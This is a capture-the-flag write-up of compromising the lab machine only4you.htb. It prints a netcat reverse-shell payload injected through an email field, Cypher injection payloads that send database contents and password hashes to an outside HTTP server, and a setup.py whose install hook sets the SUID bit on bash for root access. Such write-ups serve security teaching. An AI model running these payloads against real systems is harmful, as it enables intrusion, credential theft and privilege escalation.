 ## Enumeration:
 
I started with a quick rustscan and observed that there were two open ports: 80 and 22.
 
 ```
 sudo rustscan -a 10.10.11.210 -- -sC -sV -vv -oN onlyforyou_nmap

|_http-title: Did not follow redirect to http://only4you.htb/

```

After the port scan, I discovered a domain running on port 80: http://only4you.htb/. I added this domain to the hosts file.

Next, I checked the website and its HTML source code but didn't find anything useful for gaining initial access.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Fuzzing:

Next, I scanned for sub-directories and performed VHOST enumeration. Although I did not find anything during the sub-directory enumeration, I observed a domain called 'beta.only4you.htb' during the VHOST enumeration.

![image](https://user-images.githubusercontent.com/87700008/234087689-bf77eafe-7c74-4c13-a16d-ba5daaf82151.png)

The beta website provided functionality to resize and convert images, and I found Python source code on the homepage that was used to perform the resizing and conversion.

![image](https://user-images.githubusercontent.com/87700008/234435248-c2ce1fa5-0fff-4caa-bf36-5f53400d94b4.png)

I ran the sub-directory enumeration again for the beta website and found five sub-directories.

![image](https://user-images.githubusercontent.com/87700008/234435295-e8f7400b-4f58-4c92-b8bc-ebcb36958804.png)

At this point, I manually checked all the functions on the beta website, and since there was an upload option, I thought there might be a vulnerability in the upload function.

I started checking the source code and found that the '/download' function in "**app.py**" was vulnerable to LFI. The code checked if the image filename contained the string '..' or started with '../', but it only performed a basic check and did not sanitize user input.

![image](https://user-images.githubusercontent.com/87700008/234435937-271b662e-83ee-4cc2-aae6-f991943217f6.png)

To confirm this, I intercepted the download request using Burp Suite after uploading a random image file. After a few trials and tests, I finally confirmed the LFI vulnerability in the Image parameter.

![image](https://user-images.githubusercontent.com/87700008/234436376-98147449-e97a-4714-a22f-d08c40e43a63.png)

I observed three users apart from root in the passwd file apart from root user:
```
john
neo4j
dev
```
I knew that the website was running on the Apache Nginx configuration, which I had observed during my port scan and using Wappalyzer. I searched for the default Nginx configuration path on Google and checked the configuration on this path: "/etc/nginx/sites-available/default".
```
/etc/nginx/sites-available/default
```
![image](https://user-images.githubusercontent.com/87700008/234570849-14881545-8dbf-4e28-8b27-6198b5f7b3fc.png)

In the response, I found two paths for the Nginx config of the website:
```
- /var/www/beta.only4you.htb/
- /var/www/only4you.htb/
```

I tried different parameters multiple times but was not able to get any positive response to move further. Then, I thought maybe I should check the source code of the "only4you.htb" domain. Since I already knew from the beta website that the source code was saved in the "**app.py**" file, I tried to fetch the same file here as well.

Finally, I got a response. However, in this source code file, I observed an unusual import '**from form import sendmessage**':

![image](https://user-images.githubusercontent.com/87700008/234573417-4aac54b3-90bf-4387-a2c5-ad75b7f2cd1b.png)

I assumed that the import "form" should be located in the same directory, so I checked that file and obtained its source code:

![image](https://user-images.githubusercontent.com/87700008/234576700-b2e1fdc5-e877-4fff-97f2-395a546f2e65.png)

Here is the source code of the file:
```
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Code Analysis:

```
Code appears to be a Python script for sending an email message using the smtplib library.
The 'issecure()' function checks if the email address is valid using a regular expression.
Also, 'issecure()' function uses the 'run()' function to execute shell commands. This could potentially allow for command injection attacks if the domain variable is not properly sanitized.
The regular expression used to validate email addresses is not very strict and could potentially allow for invalid email addresses to pass through.
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Initial access:

After examining the source code, I discovered a vulnerability in the send message function. The next step was to exploit it and gain a reverse shell. Here's the request I used while testing the functionality:

![image](https://user-images.githubusercontent.com/87700008/234578655-95edfce7-dd90-496c-821d-11e22b099a9c.png)

Because the domain variable is not properly sanitized and the email address is not strictly validated, we can inject our payload in the email parameter.

I tried multiple payloads and finally found one that gave me a reverse shell:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP Port >/tmp/f
```

I added the payload after the email address using the pipe character and encoded it in URL format:

![image](https://user-images.githubusercontent.com/87700008/234580735-40a623a9-5c7d-46fb-98ec-b7b8d88df9f7.png)

Finally, I received the shell with the www-data user.(pwn3dðŸ™‚!)

![image](https://user-images.githubusercontent.com/87700008/234581090-1a5947c4-398d-4839-92e1-659badd81f85.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### User access:

Currently, I have access to the user 'www-data', but I don't have the user access that I need to move laterally and get the user flag. Since I don't have the password for the current user, I started by checking the running processes and found a few services running locally:

![image](https://user-images.githubusercontent.com/87700008/234593441-58cdd0e2-5869-469c-b964-b6a94a6ea525.png)

Out of these running services, two of the listening ports caught my attention, i.e., 8001 and 7474. As I had previously observed that a 'neo4j' user exists and the port 7474 is also running locally, I concluded that this box might be vulnerable to a 'neo4j' exploit.

For the service running on port 8001, I had to perform port forwarding to my own attacker machine. I transferred the Chisel binary and initiated port forwarding for both of the ports.

In my attacker machine:
```
./chisel_kill3r server -p 8000 --reverse
```

In the victim box:
```
./chisel_kill3r client 10.10.14.128:8000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474
```

![image](https://user-images.githubusercontent.com/87700008/234597676-01546cda-1a2b-43bb-b21f-a10f988d9293.png)
![image](https://user-images.githubusercontent.com/87700008/234597774-f0e7ef5c-bdce-465c-bf53-9b02a57ca2bc.png)

After performing the port forwarding, I loaded the service running on port 8001 and got a login page.

![image](https://user-images.githubusercontent.com/87700008/234723074-604ea8a9-c6ff-44b4-8b22-38b169263aba.png)

I tried different default credentials and finally found 'admin:admin' to be valid. This is a website with multiple data hosted on it, such as employee information, sales information, and e-mails.

![image](https://user-images.githubusercontent.com/87700008/234723577-225b8da6-381c-4294-bbce-f2a22c933e93.png)

As I observed earlier, there is a neo4j database running in the background, and in this case, when I browsed through the port 7474 service, I got the neo4j console page as well, which clearly indicates that the dashboard is running on the neo4j database.

![image](https://user-images.githubusercontent.com/87700008/234723987-b9ef1fb0-5bfa-41ef-903d-8e6096b407ad.png)

#### Injection:

Since neo4j is a database, it might be vulnerable to injection, just like an SQL DB. I started searching for neo4j injection methods and found the injection methods on the Hacktrix website, known as [cypher injection neo4j](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j).

There is a search bar in the Employees section of the dashboard that looked vulnerable to injection. I fired up Burp and intercepted the request to test it.

![image](https://user-images.githubusercontent.com/87700008/234725758-333bde8e-757a-420f-93b5-eea9346de4b0.png)

I began my exploration by checking the server version info. To do this, I passed a payload in URL-encoded format as a search parameter. As I was passing the HTTP requests, I also started my HTTP server. The payload I used was as follows:
```
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
```

![image](https://user-images.githubusercontent.com/87700008/234725974-e73af889-e367-4c78-a0fe-b768e9dd6f91.png)
![image](https://user-images.githubusercontent.com/87700008/234726008-fde79e2c-ec03-44d3-8322-32b299277c8e.png)

I obtained the label info to list all existing labels by using the following payload:
```
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://IP:80/?label='+label as l RETURN 0 as _0 //
```

![image](https://user-images.githubusercontent.com/87700008/234726758-9e2d0adb-a45d-4b2c-a8ef-92b04e2c2f1e.png)

I then discovered two tables, namely, '**user**' and '**employee**'. It was now time to retrieve information from these tables. I used the following payload for this:
```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```
![image](https://user-images.githubusercontent.com/87700008/234727096-5cee1c9c-bf30-4924-8dc0-03ae315c7441.png)

In the response, I received the admin and John's password hash. Next, I used John the Ripper to crack John's password. It took me only a few seconds to do this, and I was able to log in to John's account via SSH using the cracked password.

![image](https://user-images.githubusercontent.com/87700008/234728055-1ed4f9b5-be08-4e70-a03a-87d7b8092c94.png)

And, finally I retrieved the user flag. (pwn3d!ðŸ™‚)

![image](https://user-images.githubusercontent.com/87700008/234728218-8d3baefb-294d-494b-a994-22d27a46c887.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

After gaining access to John's account, I checked for sudo privileges and found the following:

![image](https://user-images.githubusercontent.com/87700008/234729321-b7ae0af1-b0e6-4658-83e2-c584b00c30ac.png)

I forwarded the traffic of port 3000 to my attack machine and loaded the Git server in the browser. It contained only one 'test' repository.

![image](https://user-images.githubusercontent.com/87700008/234729484-f99d6703-cb8d-4efa-9003-29f7309e8024.png)

As I only had permission to run the **pip3** command and access to the Git repository, I suspected that there might be a vulnerability in the pip download. Moreover, the **sudo** privilege allowed me to download anything from Git as long as the URL ends with '*':
```
User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

I began searching for a possible command execution method to gain root shell access and found this blog post: [Malicious Python Packages and Code Execution via pip download](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/).

I used the source code for **setup.py**, which is required to build a Python pip package, and made some changes to obtain root shell access. The final code for **setup.py** was as follows:
```
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    os.system("chmod u+s /bin/bash") #to get root bash

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "kill3r", #to create a pip package with this name
    version = "0.0.1", # random version, because it's necessary to have a version in the package.
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

Once the setup.py file was ready, I used the following command to create the package:
```
python3 setup.py sdist
```
![image](https://user-images.githubusercontent.com/87700008/234968459-90eacdbe-2be5-4ac2-931a-5b1ce1b71195.png)

My next action was to create a new repository and upload my package to it. I created a new repository named 'kill3r' and uploaded my package file to the '/dist' folder:

![image](https://user-images.githubusercontent.com/87700008/234968862-319128c2-92f8-4dc4-8ba8-dced56045454.png)

After successfully uploading the package, I downloaded the pip package with sudo command, which was also executed after the download:
```
sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/kill3r/raw/master/kill3r-0.0.1.tar.gz
```

Finally, after the download, I gained access to the root bash.(pwn3d!ðŸ™‚)
